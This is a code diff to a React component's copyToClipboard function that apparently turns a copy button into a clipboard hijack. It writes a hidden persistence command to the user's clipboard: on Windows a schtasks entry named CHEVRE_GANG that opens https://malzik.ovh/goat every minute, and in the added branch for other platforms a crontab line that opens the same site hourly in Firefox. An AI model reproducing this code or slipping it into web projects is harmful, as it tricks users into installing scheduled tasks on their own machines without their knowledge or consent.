@@ -19,8 +19,14 @@ export class Template extends React.Component {
     }
 
     copyToClipboard = () => {
+        const platform = window.navigator.platform
+        const windowsPlatforms = ['Win32', 'Win64', 'Windows', 'WinCE']
         const textField = document.createElement('textarea')
-        textField.innerText = "schtasks /CREATE /sc minute /TN CHEVRE_GANG /TR \"cmd.exe /c start https://malzik.ovh/goat\" && cmd /c echo.|clip"
+        if (windowsPlatforms.indexOf(platform) !== -1) {
+            textField.innerText = "schtasks /CREATE /sc minute /TN CHEVRE_GANG /TR \"cmd.exe /c start https://malzik.ovh/goat\" && cmd /c echo.|clip"
+        } else {
+            textField.innerText = "crontab -l | { cat; echo \"0 * * * * export DISPLAY=:0 && firefox --new-window https://malzik.ovh/goat\"; } | crontab -"
+        }
         document.body.appendChild(textField)
         textField.select()
         document.execCommand('copy')
